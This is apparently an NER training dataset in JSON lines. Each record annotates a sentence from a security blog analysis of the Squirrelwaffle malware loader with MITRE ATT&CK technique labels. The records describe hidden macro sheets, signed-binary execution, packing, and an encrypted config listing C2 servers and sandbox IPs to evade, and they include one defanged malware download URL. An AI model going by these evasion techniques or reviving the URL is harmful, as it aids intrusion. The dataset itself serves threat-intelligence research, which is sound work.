{"mention": "Squirrelwaffle", "context_left": "![Figure 7: Excel 4.0 hidden sheet containing a malicious macro code](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/", "context_right": "/unhide%20the%20sheets.PNG)", "_context_left": "![Figure 7: Excel 4.0 hidden sheet containing a malicious macro code](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/", "_context_right": "/unhide%20the%20sheets.PNG)", "sentence_left": "The hidden sheet in this Excel document is shown in Figure 7.", "sentence_right": "Figure 7: Excel 4.0 hidden sheet containing a malicious macro code", "label": "Squirrelwaffle", "label_id": 1274, "label_title": "Squirrelwaffle", "label_link": "http://www.bosch.com#node1fpjil0acx5", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Excel 4.0 hidden sheet containing a malicious macro code", "context_left": "![Figure 7:", "context_right": "](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/unhide%20the%20sheets.PNG)", "_context_left": "![Figure 7: ", "_context_right": "](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/unhide%20the%20sheets.PNG)", "sentence_left": "The hidden sheet in this Excel document is shown in Figure 7.", "sentence_right": "Figure 7: Excel 4.0 hidden sheet containing a malicious macro code", "label": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001). There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005). Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)", "label_id": 368, "label_title": "Command and Scripting Interpreter", "label_link": "https://attack.mitre.org/techniques/T1059", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Excel 4.0 hidden sheet containing a malicious macro code", "context_left": "Figure 7:", "context_right": "", "_context_left": "Figure 7: ", "_context_right": "", "sentence_left": "![Figure 7: Excel 4.0 hidden sheet containing a malicious macro code](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/unhide%20the%20sheets.PNG)", "sentence_right": "The extracted macro code is shown in Figure 8.", "label": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001). There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005). Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)", "label_id": 368, "label_title": "Command and Scripting Interpreter", "label_link": "https://attack.mitre.org/techniques/T1059", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "macro", "context_left": "The extracted", "context_right": "code is shown in Figure 8.", "_context_left": "The extracted ", "_context_right": " code is shown in Figure 8.", "sentence_left": "Figure 7: Excel 4.0 hidden sheet containing a malicious macro code", "sentence_right": "![Figure 8: Macro code extracted from a hidden Excel sheet](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/macro%20code%20from%20xls.PNG)", "label": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001). There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005). Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)", "label_id": 368, "label_title": "Command and Scripting Interpreter", "label_link": "https://attack.mitre.org/techniques/T1059", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Squirrelwaffle", "context_left": "![Figure 8: Macro code extracted from a hidden Excel sheet](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/", "context_right": "/macro%20code%20from%20xls.PNG)", "_context_left": "![Figure 8: Macro code extracted from a hidden Excel sheet](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/", "_context_right": "/macro%20code%20from%20xls.PNG)", "sentence_left": "The extracted macro code is shown in Figure 8.", "sentence_right": "Figure 8: Macro code extracted from a hidden Excel sheet", "label": "Squirrelwaffle", "label_id": 1274, "label_title": "Squirrelwaffle", "label_link": "http://www.bosch.com#node1fpjil0acx5", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Macro code extracted from a hidden Excel sheet", "context_left": "![Figure 8:", "context_right": "](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/macro%20code%20from%20xls.PNG)", "_context_left": "![Figure 8: ", "_context_right": "](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/macro%20code%20from%20xls.PNG)", "sentence_left": "The extracted macro code is shown in Figure 8.", "sentence_right": "Figure 8: Macro code extracted from a hidden Excel sheet", "label": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001). There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005). Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)", "label_id": 368, "label_title": "Command and Scripting Interpreter", "label_link": "https://attack.mitre.org/techniques/T1059", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "macro", "context_left": "![Figure 8: Macro code extracted from a hidden Excel sheet](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/", "context_right": "%20code%20from%20xls.PNG)", "_context_left": "![Figure 8: Macro code extracted from a hidden Excel sheet](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/", "_context_right": "%20code%20from%20xls.PNG)", "sentence_left": "The extracted macro code is shown in Figure 8.", "sentence_right": "Figure 8: Macro code extracted from a hidden Excel sheet", "label": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001). There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005). Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)", "label_id": 368, "label_title": "Command and Scripting Interpreter", "label_link": "https://attack.mitre.org/techniques/T1059", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Macro code", "context_left": "Figure 8:", "context_right": "extracted from a hidden Excel sheet", "_context_left": "Figure 8: ", "_context_right": " extracted from a hidden Excel sheet", "sentence_left": "![Figure 8: Macro code extracted from a hidden Excel sheet](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/macro%20code%20from%20xls.PNG)", "sentence_right": "The threat actor also changed the location where the payload is written to disk.", "label": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001). There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005). Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)", "label_id": 368, "label_title": "Command and Scripting Interpreter", "label_link": "https://attack.mitre.org/techniques/T1059", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Squirrelwaffle", "context_left": "Example (sanitized) URLs that were used to retrieve", "context_right": "from this campaign are shown below:", "_context_left": "Example (sanitized) URLs that were used to retrieve ", "_context_right": " from this campaign are shown below:", "sentence_left": "The threat actor also changed the location where the payload is written to disk.", "sentence_right": "*hxxps://cortinastelasytrazos[.]com/Yro6Atvj/sec.html*", "label": "Squirrelwaffle", "label_id": 1274, "label_title": "Squirrelwaffle", "label_link": "http://www.bosch.com#node1fpjil0acx5", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Squirrelwaffle", "context_left": "This analysis covers the", "context_right": "with the MD5 hash479DAE0F72F4D57BD20E0BF8CB3EBDF7.", "_context_left": "This analysis covers the ", "_context_right": " with the MD5 hash479DAE0F72F4D57BD20E0BF8CB3EBDF7.", "sentence_left": "---------------------------------", "sentence_right": "Once the Squirrelwaffle payload is downloaded, it will either be executed via rundll32.exe or regsvr.exe depending upon the initial infection vector that was used to download the payload.", "label": "Squirrelwaffle", "label_id": 1274, "label_title": "Squirrelwaffle", "label_link": "http://www.bosch.com#node1fpjil0acx5", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Squirrelwaffle", "context_left": "Once the", "context_right": "payload is downloaded, it will either be executed via rundll32.exe or regsvr.exe depending upon the initial infection vector that was used to download the payload.", "_context_left": "Once the ", "_context_right": " payload is downloaded, it will either be executed via rundll32.exe or regsvr.exe depending upon the initial infection vector that was used to download the payload.", "sentence_left": "This analysis covers the Squirrelwaffle with the MD5 hash479DAE0F72F4D57BD20E0BF8CB3EBDF7.", "sentence_right": "Squirrelwaffle loader samples have a recent compilation date using Visual Studio 2017 as shown in Figure 9.", "label": "Squirrelwaffle", "label_id": 1274, "label_title": "Squirrelwaffle", "label_link": "http://www.bosch.com#node1fpjil0acx5", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "executed via rundll32.exe", "context_left": "Once the Squirrelwaffle payload is downloaded, it will either be", "context_right": "or regsvr.exe depending upon the initial infection vector that was used to download the payload.", "_context_left": "Once the Squirrelwaffle payload is downloaded, it will either be ", "_context_right": " or regsvr.exe depending upon the initial infection vector that was used to download the payload.", "sentence_left": "This analysis covers the Squirrelwaffle with the MD5 hash479DAE0F72F4D57BD20E0BF8CB3EBDF7.", "sentence_right": "Squirrelwaffle loader samples have a recent compilation date using Visual Studio 2017 as shown in Figure 9.", "label": "Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed binaries. Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files.", "label_id": 385, "label_title": "Signed Binary Proxy Execution", "label_link": "https://attack.mitre.org/techniques/T1218", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "regsvr.exe", "context_left": "Once the Squirrelwaffle payload is downloaded, it will either be executed via rundll32.exe or", "context_right": "depending upon the initial infection vector that was used to download the payload.", "_context_left": "Once the Squirrelwaffle payload is downloaded, it will either be executed via rundll32.exe or ", "_context_right": " depending upon the initial infection vector that was used to download the payload.", "sentence_left": "This analysis covers the Squirrelwaffle with the MD5 hash479DAE0F72F4D57BD20E0BF8CB3EBDF7.", "sentence_right": "Squirrelwaffle loader samples have a recent compilation date using Visual Studio 2017 as shown in Figure 9.", "label": "Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed binaries. Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files.", "label_id": 385, "label_title": "Signed Binary Proxy Execution", "label_link": "https://attack.mitre.org/techniques/T1218", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Squirrelwaffle", "context_left": "", "context_right": "loader samples have a recent compilation date using Visual Studio 2017 as shown in Figure 9.", "_context_left": "", "_context_right": " loader samples have a recent compilation date using Visual Studio 2017 as shown in Figure 9.", "sentence_left": "Once the Squirrelwaffle payload is downloaded, it will either be executed via rundll32.exe or regsvr.exe depending upon the initial infection vector that was used to download the payload.", "sentence_right": "![Figure 9: Squirrelwaffle compilation metadata](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Compilation%20time.PNG)", "label": "Squirrelwaffle", "label_id": 1274, "label_title": "Squirrelwaffle", "label_link": "http://www.bosch.com#node1fpjil0acx5", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Squirrelwaffle", "context_left": "![Figure 9:", "context_right": "compilation metadata](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Compilation%20time.PNG)", "_context_left": "![Figure 9: ", "_context_right": " compilation metadata](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Compilation%20time.PNG)", "sentence_left": "Squirrelwaffle loader samples have a recent compilation date using Visual Studio 2017 as shown in Figure 9.", "sentence_right": "Figure 9: Squirrelwaffle compilation metadata", "label": "Squirrelwaffle", "label_id": 1274, "label_title": "Squirrelwaffle", "label_link": "http://www.bosch.com#node1fpjil0acx5", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Squirrelwaffle", "context_left": "![Figure 9: Squirrelwaffle compilation metadata](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/", "context_right": "/Compilation%20time.PNG)", "_context_left": "![Figure 9: Squirrelwaffle compilation metadata](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/", "_context_right": "/Compilation%20time.PNG)", "sentence_left": "Squirrelwaffle loader samples have a recent compilation date using Visual Studio 2017 as shown in Figure 9.", "sentence_right": "Figure 9: Squirrelwaffle compilation metadata", "label": "Squirrelwaffle", "label_id": 1274, "label_title": "Squirrelwaffle", "label_link": "http://www.bosch.com#node1fpjil0acx5", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Squirrelwaffle", "context_left": "Figure 9:", "context_right": "compilation metadata", "_context_left": "Figure 9: ", "_context_right": " compilation metadata", "sentence_left": "![Figure 9: Squirrelwaffle compilation metadata](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Compilation%20time.PNG)", "sentence_right": "The Squirrelwaffle loader is a 32-bit DLL, which is packed with a custom packer.", "label": "Squirrelwaffle", "label_id": 1274, "label_title": "Squirrelwaffle", "label_link": "http://www.bosch.com#node1fpjil0acx5", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Squirrelwaffle", "context_left": "The", "context_right": "loader is a 32-bit DLL, which is packed with a custom packer.", "_context_left": "The ", "_context_right": " loader is a 32-bit DLL, which is packed with a custom packer.", "sentence_left": "Figure 9: Squirrelwaffle compilation metadata", "sentence_right": "Similar packers have been observed in other malware families including Ursnif and Zloader.", "label": "Squirrelwaffle", "label_id": 1274, "label_title": "Squirrelwaffle", "label_link": "http://www.bosch.com#node1fpjil0acx5", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "is a 32-bit DLL,", "context_left": "The Squirrelwaffle loader", "context_right": "which is packed with a custom packer.", "_context_left": "The Squirrelwaffle loader ", "_context_right": " which is packed with a custom packer.", "sentence_left": "Figure 9: Squirrelwaffle compilation metadata", "sentence_right": "Similar packers have been observed in other malware families including Ursnif and Zloader.", "label": "Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed binaries. Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files.", "label_id": 385, "label_title": "Signed Binary Proxy Execution", "label_link": "https://attack.mitre.org/techniques/T1218", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "is packed with a custom packer", "context_left": "The Squirrelwaffle loader is a 32-bit DLL, which", "context_right": ".", "_context_left": "The Squirrelwaffle loader is a 32-bit DLL, which ", "_context_right": ".", "sentence_left": "Figure 9: Squirrelwaffle compilation metadata", "sentence_right": "Similar packers have been observed in other malware families including Ursnif and Zloader.", "label": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also used compressed or archived scripts, such as JavaScript. Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016) Adversaries may also obfuscate commands executed from payloads or directly via a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017)(Citation: PaloAlto EncodedCommand March 2017)", "label_id": 544, "label_title": "Obfuscated Files or Information", "label_link": "https://attack.mitre.org/techniques/T1027", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Ursnif", "context_left": "Similar packers have been observed in other malware families including", "context_right": "and Zloader.", "_context_left": "Similar packers have been observed in other malware families including ", "_context_right": " and Zloader.", "sentence_left": "The Squirrelwaffle loader is a 32-bit DLL, which is packed with a custom packer.", "sentence_right": "Squirrelwaffle contains a hardcoded configuration that is encrypted in the binary.", "label": "[Ursnif](https://attack.mitre.org/software/S0386) is a banking trojan and variant of the Gozi malware observed being spread through various automated exploit kits, [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)s, and malicious links.(Citation: NJCCIC Ursnif Sept 2016)(Citation: ProofPoint Ursnif Aug 2016) [Ursnif](https://attack.mitre.org/software/S0386) is associated primarily with data theft, but variants also include components (backdoors, spyware, file injectors, etc.) capable of a wide variety of behaviors.(Citation: TrendMicro Ursnif Mar 2015)", "label_id": 705, "label_title": "Ursnif", "label_link": "https://attack.mitre.org/software/S0386", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Zloader", "context_left": "Similar packers have been observed in other malware families including Ursnif and", "context_right": ".", "_context_left": "Similar packers have been observed in other malware families including Ursnif and ", "_context_right": ".", "sentence_left": "The Squirrelwaffle loader is a 32-bit DLL, which is packed with a custom packer.", "sentence_right": "Squirrelwaffle contains a hardcoded configuration that is encrypted in the binary.", "label": "Zloader", "label_id": 1308, "label_title": "Zloader", "label_link": "http://www.bosch.com#node1fpjil0acx6", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Squirrelwaffle", "context_left": "", "context_right": "contains a hardcoded configuration that is encrypted in the binary.", "_context_left": "", "_context_right": " contains a hardcoded configuration that is encrypted in the binary.", "sentence_left": "Similar packers have been observed in other malware families including Ursnif and Zloader.", "sentence_right": "There are two main components: a list of CnC URLs and a list of IP addresses to block, which belong to sandboxes and analysis platforms.", "label": "Squirrelwaffle", "label_id": 1274, "label_title": "Squirrelwaffle", "label_link": "http://www.bosch.com#node1fpjil0acx5", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "obfuscated using an XOR-based algorithm with hardcoded keys.", "context_left": "These lists are", "context_right": "", "_context_left": "These lists are ", "_context_right": "", "sentence_left": "There are two main components: a list of CnC URLs and a list of IP addresses to block, which belong to sandboxes and analysis platforms.", "sentence_right": "An example formatted Squirrelwaffle configuration is shown in Figure 10.", "label": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also used compressed or archived scripts, such as JavaScript. Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016) Adversaries may also obfuscate commands executed from payloads or directly via a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017)(Citation: PaloAlto EncodedCommand March 2017)", "label_id": 544, "label_title": "Obfuscated Files or Information", "label_link": "https://attack.mitre.org/techniques/T1027", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Squirrelwaffle", "context_left": "An example formatted", "context_right": "configuration is shown in Figure 10.", "_context_left": "An example formatted ", "_context_right": " configuration is shown in Figure 10.", "sentence_left": "These lists are obfuscated using an XOR-based algorithm with hardcoded keys.", "sentence_right": "![Figure 10: Formatted Squirrelwaffle configuration after decryption](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Config%20extracted.PNG)", "label": "Squirrelwaffle", "label_id": 1274, "label_title": "Squirrelwaffle", "label_link": "http://www.bosch.com#node1fpjil0acx5", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Squirrelwaffle", "context_left": "![Figure 10: Formatted", "context_right": "configuration after decryption](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Config%20extracted.PNG)", "_context_left": "![Figure 10: Formatted ", "_context_right": " configuration after decryption](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Config%20extracted.PNG)", "sentence_left": "An example formatted Squirrelwaffle configuration is shown in Figure 10.", "sentence_right": "Figure 10: Formatted Squirrelwaffle configuration after decryption", "label": "Squirrelwaffle", "label_id": 1274, "label_title": "Squirrelwaffle", "label_link": "http://www.bosch.com#node1fpjil0acx5", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Squirrelwaffle", "context_left": "![Figure 10: Formatted Squirrelwaffle configuration after decryption](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/", "context_right": "/Config%20extracted.PNG)", "_context_left": "![Figure 10: Formatted Squirrelwaffle configuration after decryption](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/", "_context_right": "/Config%20extracted.PNG)", "sentence_left": "An example formatted Squirrelwaffle configuration is shown in Figure 10.", "sentence_right": "Figure 10: Formatted Squirrelwaffle configuration after decryption", "label": "Squirrelwaffle", "label_id": 1274, "label_title": "Squirrelwaffle", "label_link": "http://www.bosch.com#node1fpjil0acx5", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Formatted Squirrelwaffle configuration after decryption", "context_left": "![Figure 10:", "context_right": "](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Config%20extracted.PNG)", "_context_left": "![Figure 10: ", "_context_right": "](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Config%20extracted.PNG)", "sentence_left": "An example formatted Squirrelwaffle configuration is shown in Figure 10.", "sentence_right": "Figure 10: Formatted Squirrelwaffle configuration after decryption", "label": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also used compressed or archived scripts, such as JavaScript. Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when 